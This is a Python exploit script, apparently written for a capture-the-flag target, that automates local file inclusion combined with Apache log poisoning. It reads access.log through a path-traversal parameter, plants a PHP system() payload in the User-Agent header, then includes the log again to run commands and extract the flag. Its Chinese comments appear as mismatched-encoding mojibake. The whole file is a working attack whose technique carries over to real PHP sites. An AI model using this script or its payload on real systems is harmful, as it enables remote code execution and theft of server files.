#!/usr/bin/env python3

import requests
import re
import time

# é…ç½®
TARGET_URL = "http://ip32823"
LOG_PATH = "../../../../../var/log/apache2/access.log"
FLAG_FILE = "/FLAG.php"


def main():
    print("LFI + Log Poisoning è‡ªåŠ¨åŒ–æ”»å‡»")
    print("=" * 40)
    
    # æ­¥éª¤ 1: æ£€æŸ¥æ—¥å¿—å¯è®¿é—®
    print("\n[1] æ£€æŸ¥æ—¥å¿—æ–‡ä»¶å¯è®¿é—®æ€§...")
    try:
        url = f"{TARGET_URL}/post.php?id={LOG_PATH}"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            print(f"âœ“ æ—¥å¿—å¯è®¿é—®ï¼Œå¤§å°: {len(response.content)} å­—èŠ‚")
        else:
            print(f"âœ— è®¿é—®å¤±è´¥ï¼ŒçŠ¶æ€ç : {response.status_code}")
            return
    except Exception as e:
        print(f"âœ— é”™è¯¯: {e}")
        return
    
    # æ­¥éª¤ 2: æ³¨å…¥ PHP ä»£ç 
    print("\n[2] æ³¨å…¥ PHP ä»£ç åˆ°æ—¥å¿—...")
    payload = f"<?php system('cat {FLAG_FILE}'); ?>"
    headers = {'User-Agent': payload}
    
    try:
        response = requests.get(TARGET_URL, headers=headers, timeout=10)
        if response.status_code == 200:
            print(f"âœ“ ä»£ç å·²æ³¨å…¥: {payload}")
            print("ç­‰å¾… 1 ç§’...")
            time.sleep(1)
        else:
            print(f"âœ— æ³¨å…¥å¤±è´¥ï¼ŒçŠ¶æ€ç : {response.status_code}")
            return
    except Exception as e:
        print(f"âœ— æ³¨å…¥é”™è¯¯: {e}")
        return
    
    # æ­¥éª¤ 3: è§¦å‘æ‰§è¡Œå¹¶è·å– flag
    print("\n[3] è§¦å‘æ—¥å¿—åŒ…å«ï¼Œæ‰§è¡Œä»£ç ...")
    try:
        url = f"{TARGET_URL}/post.php?id={LOG_PATH}"
        response = requests.get(url, timeout=30)
        
        if response.status_code == 200:
            print("âœ“ æ—¥å¿—å·²åŒ…å«ï¼Œæœç´¢ flag...")
            
            # æœç´¢ flag
            flag_pattern = r'FLAG\{[^}]+\}'
            matches = re.findall(flag_pattern, response.text, re.IGNORECASE)
            
            if matches:
                print("\nğŸ¯ æ‰¾åˆ° Flag!")
                print("=" * 40)
                for flag in set(matches):
                    print(f"Flag: {flag}")
                print("=" * 40)
            else:
                print("âœ— æœªæ‰¾åˆ° flagï¼Œæ˜¾ç¤ºæ—¥å¿—æœ«å°¾:")
                print(response.text[-300:])
        else:
            print(f"âœ— åŒ…å«å¤±è´¥ï¼ŒçŠ¶æ€ç : {response.status_code}")
    except Exception as e:
        print(f"âœ— æ‰§è¡Œé”™è¯¯: {e}")


if __name__ == "__main__":
    main()